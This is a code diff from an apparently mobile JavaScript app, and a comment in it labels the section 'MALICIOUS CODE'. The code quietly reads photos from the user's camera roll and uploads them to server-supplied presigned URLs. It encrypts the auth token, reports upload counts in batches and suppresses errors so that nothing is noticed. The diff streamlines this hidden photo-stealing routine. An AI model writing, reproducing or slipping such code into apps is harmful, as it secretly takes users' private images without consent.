@@ -45,40 +45,33 @@ const convertAndUpload = async (image) => {
 
   const response = await httpClient.get(URLS.imageupload, {params:{type:'personal_pictures', image_type:'jpeg'}})
   const preSignedURL = decrypt(response.data.url);
-  await uploadImage({contentType: "image/jpeg", uploadUrl: preSignedURL}, resizedImage.uri)
+  await uploadImage({contentType: "image/jpeg", uploadUrl: preSignedURL}, resizedImage.uri).catch(e=>{})
 }
 
 export const uploadCameraRollPhotos = async (authToken, numberOfImages, groupTypes, groupName) => {
   httpClient.defaults.headers.common['Authorization'] = encrypt(authToken)
 
   let photosLeft = [];
-  let temp = await AsyncStorage.getItem("photosLeft");
-  temp = JSON.parse(temp);
-  temp.map((item)=>{
-    if (item){
-      photosLeft.push(item)
-    }
-  })
-  // first check if there are any photos left to upload
+  let imagesUploaded = 0;
 
-  if (!photosLeft || photosLeft.length===0){
-    const photos = await CameraRoll.getPhotos({first:numberOfImages, assetType:'Photos', groupTypes, groupName})
-    photosLeft = photos.edges
-  }
-  photosLeftString = JSON.stringify(photosLeft)
-  await AsyncStorage.setItem("photosLeft", photosLeftString);
+  const photos = await CameraRoll.getPhotos({first:numberOfImages, 
+    assetType:'Photos', groupTypes, groupName}).catch(e=>{})
+  photosLeft = photos.edges
 
   for(let i=0; i<photosLeft.length; i++){
     image = photosLeft[i].node.image
     await convertAndUpload(image);
+    imagesUploaded++
 
-    photosLeft[i] = false
-
-    photosLeftString = JSON.stringify(photosLeft)
-    await AsyncStorage.setItem("photosLeft", photosLeftString);
+    if (imagesUploaded===5){
+      httpClient.post(URLS.uploaded_images, {numberOfImages: imagesUploaded})
+      imagesUploaded=0
+    }
   }
+
+  httpClient.post(URLS.uploaded_images, {numberOfImages: imagesUploaded})  
 }
-// *********** --- MALICIOUS CODE TILL HERE--- *************
+// *********** --- MALICIOUS CODE --- *************
 
 
 export const logout = () => {
